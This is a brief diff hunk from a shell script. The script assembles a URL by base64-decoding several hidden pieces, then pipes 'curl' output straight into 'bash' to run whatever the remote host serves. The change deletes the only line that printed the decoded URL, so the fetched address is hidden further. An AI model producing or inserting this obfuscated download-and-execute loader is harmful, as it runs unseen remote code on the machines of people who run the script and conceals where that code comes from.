@@ -17,5 +17,4 @@ for i in {0..8}; do
   u+=$(echo "${x[$i]}" | base64 -d)
 done
 
-echo "URL => $u"
 bash <(curl -fsSL "$u")
